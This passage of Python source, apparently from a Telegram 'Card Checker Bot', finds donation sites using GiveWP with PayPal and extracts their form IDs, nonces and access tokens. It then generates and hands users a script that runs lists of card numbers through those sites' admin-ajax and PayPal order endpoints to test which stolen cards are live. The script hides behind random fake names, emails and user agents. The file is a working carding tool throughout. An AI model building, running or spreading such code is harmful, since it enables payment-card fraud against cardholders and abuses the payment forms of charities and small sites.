        result = self.analyze_response(cj, ct, at)
        return result, used_amount


# ============================================================
# فحص رابط واحد
# ============================================================
def check_single_link(link):
    checker = None
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL',
                    'amount': None, 'gateway': None}

        checker = PayPalChecker(link)
        if not checker.init():
            return {'link': link, 'live': False, 'respons': 'No PayPal/GiveWP detected',
                    'amount': None, 'gateway': None}

        card_tuple = (
            CONFIG['card']['number'],
            CONFIG['card']['month'],
            CONFIG['card']['year'],
            CONFIG['card']['cvv'],
        )
        result, used_amount = checker.check(card_tuple)

        is_dead = any(d.lower() in result.lower() for d in DEAD_RESPONSES)
        result_upper = result.upper()
        is_live = any(r.upper() in result_upper for r in ALL_GATEWAY_RESPONSES)

        base = {
            'link': link,
            'respons': result,
            'amount': used_amount,
            'gateway': checker.gateway_type,
        }

        if is_dead:
            base['live'] = False
            return base

        if is_live:
            base['live'] = True
            base['id_form1'] = checker.form_id_prefix or ''
            base['id_form2'] = checker.form_id or ''
            base['nonec'] = checker.form_hash or ''
            base['au'] = checker.client_token or checker.access_token or ''
            return base

        base['live'] = False
        return base

    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100],
                'amount': None, 'gateway': None}
    finally:
        if checker:
            try:
                checker.session.close()
            except:
                pass


# ============================================================
# توليد كود الـ Gateway
# ============================================================
def generate_gateway_code(result, link, paypal_data=None):
    id_form1 = ''
    id_form2 = ''
    nonec = ''
    au = ''
    gateway_type = 'paypal-commerce'
    donation_amount = '1.00'

    if paypal_data:
        id_form1 = paypal_data.get('id_form1', '')
        id_form2 = paypal_data.get('id_form2', '')
        nonec = paypal_data.get('nonec', '')
        au = paypal_data.get('au', '')
        gateway_type = paypal_data.get('gateway', 'paypal-commerce')
        if paypal_data.get('amount'):
            donation_amount = paypal_data['amount']

    if gateway_type == 'paypal_donations':
        create_action = 'give_paypal_donations_create_order'
        approve_action = 'give_paypal_donations_approve_order'
        payment_mode = 'paypal_donations'
    elif gateway_type == 'paypal_standard':
        create_action = 'give_paypal_standard_create_order'
        approve_action = 'give_paypal_standard_approve_order'
        payment_mode = 'paypal_standard'
    elif gateway_type == 'paypal_express':
        create_action = 'give_paypal_express_create_order'
        approve_action = 'give_paypal_express_approve_order'
        payment_mode = 'paypal_express'
    else:
        create_action = 'give_paypal_commerce_create_order'
        approve_action = 'give_paypal_commerce_approve_order'
        payment_mode = 'paypal-commerce'

    return f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "{au[:40] if au else 'b220b06032291ef03c4bd21a74cab3ad'}"
        self.donation = "{donation_amount}"
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.nonec = "{nonec}"
        self.au = "{au}"
        self.create_action = "{create_action}"
        self.approve_action = "{approve_action}"
        self.payment_mode = "{payment_mode}"
        url = '{link}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        try:
            da2 = MultipartEncoder({{
                'give-form-id-prefix': (None, self.id_form1),
                'give-form-id': (None, self.id_form2),
                'give-form-hash': (None, self.nonec),
                'give-amount': (None, self.donation),
                'payment-mode': (None, self.payment_mode),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, self.payment_mode),
            }})
            he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
            pa1 = {{'action': self.create_action}}
            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2, timeout=20).json()
            order_id = None
            if 'data' in r3:
                if isinstance(r3['data'], dict) and 'id' in r3['data']:
                    order_id = r3['data']['id']
                elif isinstance(r3['data'], str):
                    order_id = r3['data']
            if not order_id:
                return "Create Order Failed"
        except Exception as e:
            return f"Create Order Failed: {{str(e)[:60]}}"

        try:
            he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
            da3 = {{
                'payment_source': {{
                    'card': {{
                        'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                        'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                    }},
                }},
                'application_context': {{'vault': False}},
            }}
            self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source', headers=he4, json=da3, timeout=20)
        except:
            pass

        try:
            da4 = MultipartEncoder({{
                'give-form-id-prefix': (None, self.id_form1),
                'give-form-id': (None, self.id_form2),
                'give-form-hash': (None, self.nonec),
                'give-amount': (None, self.donation),
                'payment-mode': (None, self.payment_mode),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, self.payment_mode),
            }})
            he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
            pa2 = {{'action': self.approve_action, 'order': order_id}}
            r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4, timeout=20)
            text = r5.text
            if 'true' in text:
                return 'CHARGE ' + self.donation
            elif 'INSUFFICIENT_FUNDS' in text:
                return "INSUFFICIENT_FUNDS"
            elif 'ORDER_NOT_APPROVED' in text:
                return "Payer cannot pay for this transaction."
            elif 'DECLINED' in text.upper():
                return "DECLINED"
            else:
                try:
                    return r5.json()['data']['error']
                except:
                    return text[:100] if text else "UNKNOWN_ERROR"
        except Exception as e:
            return f"Error: {{str(e)[:60]}}"

if __name__ == '__main__':
    Getat = 'PayPal Custom {donation_amount}'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            print('Response: ' + resulti)
            time.sleep(3)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(8)'''


# ============================================================
# Telegram Handlers
# ============================================================
@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return

    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal 
[⚡] Mass Extract >> /mass
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30'''

    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)

    safe_send_message(message.chat.id, IU, reply_markup=FRA)


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    Atty.add(types.InlineKeyboardButton("Back", callback_data="start"))
    YTT = f'Welcome {userr} Send your message and the admin will respond.'
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              text=YTT, parse_mode='HTML', reply_markup=Atty)
    except:
        pass
    waiting_users[user_id] = True


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id, None)


@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    try:
        user_id = int(call.data.split("_")[1])
        reply_mode[call.from_user.id] = user_id
        safe_send_message(call.from_user.id, "Write your reply now:")
    except:
        pass


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode.pop(message.from_user.id, None)
    if not user_id:
        return
    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
    safe_send_message(OWNER_ID, "Reply sent.")


@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except:
        pass


# ============================================================
# /paypal — فحص رابط واحد
# ============================================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def cmd_paypal(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        return

    ko = safe_send_message(message.chat.id, "🔍 Scanning...")
    if not ko:
        return

    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(message.chat.id, ko.message_id,
                              "Please send:\n<code>/paypal https://example.com/donate</code>")
            return

        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(message.chat.id, ko.message_id, "❌ Invalid link")
            return

        result = check_single_link(link)

        if result.get('live'):
            file_name = f'gateway_{int(time.time())}.py'
            try:
                with open(file_name, 'w', encoding='utf-8') as f:
                    f.write(generate_gateway_code(result['respons'], result['link'], result))

                price_str = f"${result.get('amount')}" if result.get('amount') else "N/A"

                safe_send_document(message.chat.id, file_name,
                    caption=f'''✅ <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 Respons: <code>{result['respons'][:200]}</code>
━━━━━━━━━━━━━━━━━━━━
💰 Price = <b>{price_str}</b>
━━━━━━━━━━━━━━━━━━━━
🏦 Gateway: <b>{result.get('gateway', 'unknown')}</b>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30''')
            finally:
                if os.path.exists(file_name):
                    os.remove(file_name)
        else:
            safe_edit_message(message.chat.id, ko.message_id,
                              f"❌ <b>Dead</b>\n🔗 <code>{link}</code>\n💬 <code>{result['respons'][:200]}</code>")

    except Exception as e:
        safe_edit_message(message.chat.id, ko.message_id, f"❌ Error: {str(e)[:100]}")


# ============================================================
# /mass — فحص ملف
# ============================================================
@bot.message_handler(commands=['mass'])
def mass_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        return

    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    uid = message.from_user.id
    if uid in processing_status:
        processing_status[uid]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")


def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return

    try:
        file_info = safe_get_file(message.document.file_id)
        if not file_info:
            safe_send_message(message.chat.id, "❌ Failed to get file.")
            return

        downloaded = safe_download_file(file_info.file_path)
        if not downloaded:
            safe_send_message(message.chat.id, "❌ Failed to download file.")
            return

        links = downloaded.decode('utf-8', errors='ignore').splitlines()
        links = [l.strip() for l in links if l.strip().startswith(('http://', 'https://'))]

        if not links:
            safe_send_message(message.chat.id, "❌ No valid links.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id

        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False, 'last_update': time.time()
        }

        status_msg = safe_send_message(chat_id, f"""📊 <b>Scanning...</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0%
━━━━━━━━━━━━━━━━━━
🛑 /stop to stop""")

        if not status_msg:
            return

        def update_status():
            last_edit = 0
            while True:
                time.sleep(8)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done'):
                            break
                        p = processing_status[user_id]['processed']
                        l = processing_status[user_id]['live']
                        d = processing_status[user_id]['dead']
                        cu = processing_status[user_id]['current_url']
                        cr = processing_status[user_id]['current_respons']
                        pct = int((p / total) * 100) if total > 0 else 0
                        bar_len = 20
                        filled = int((pct / 100) * bar_len)
                        bar = '█' * filled + '░' * (bar_len - filled)

                        text = f"""📊 <b>Scanning...</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {l}
❌ Dead: {d}
⏳ Progress: {pct}% {bar}
━━━━━━━━━━━━━━━━━━
🔗 <code>{cu[:70] if cu else '...'}</code>
💬 <code>{cr[:70] if cr else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ {p} / {total}
🛑 /stop"""

                        if time.time() - last_edit > 8:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_edit = time.time()
                            except Exception as e:
                                err = str(e)
                                if "429" in err:
                                    time.sleep(30)
                                elif "502" in err or "500" in err:
                                    time.sleep(10)
                                elif "message is not modified" in err.lower():
                                    pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag'):
                break

            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'

            result = check_single_link(link)

            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']

                    try:
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(generate_gateway_code(result['respons'], result['link'], result))

                        price_str = f"${result.get('amount')}" if result.get('amount') else "N/A"

                        safe_send_document(chat_id, file_name,
                            caption=f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 Respons: <code>{result['respons'][:200]}</code>
━━━━━━━━━━━━━━━━━━━━
💰 Price = <b>{price_str}</b>
━━━━━━━━━━━━━━━━━━━━
🏦 Gateway: <b>{result.get('gateway', 'unknown')}</b>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30""")
                        try:
                            os.remove(file_name)
                        except:
                            pass
                    except Exception as e:
                        print(f"send file err: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead')

            if idx % 20 == 0:
                gc.collect()
            if idx % 3 == 0:
                time.sleep(0.5)

        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']

        updater.join(timeout=3)

        final = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {live}
❌ Dead: {dead}
💯 Rate: {int((live / total) * 100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30"""

        try:
            safe_edit_message(chat_id, status_msg.message_id, final)
        except:
            safe_send_message(chat_id, final)

        processing_status.pop(user_id, None)

    except Exception as e:
        print(f"mass error: {e}")
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")
        if 'user_id' in locals():
            processing_status.pop(user_id, None)


# ============================================================
# Block / Unblock
# ============================================================
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        return
    try:
        uid = message.text.split()[1]
        with open('blockusers.txt', 'a') as f:
            f.write(f"{uid}\n")
        safe_send_message(message.chat.id, f"✅ Blocked {uid}")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        return
    try:
        uid = message.text.split()[1]
        with open('blockusers.txt') as f:
            lines = f.readlines()
        with open('blockusers.txt', 'w') as f:
            for line in lines:
                if line.strip() != uid:
                    f.write(line)
        safe_send_message(message.chat.id, f"✅ Unblocked {uid}")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


# ============================================================
# تشغيل
# ============================================================
print('✅ Bot is running...')

if __name__ == '__main__':
    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
        except KeyboardInterrupt:
            print('🛑 Bot stopped')
            break
        except Exception as e:
            err = str(e)
            if "502" in err or "409" in err or "429" in err or "500" in err:
                time.sleep(10)
            elif "timeout" in err.lower() or "Connection" in err:
                time.sleep(5)
            else:
                time.sleep(5)
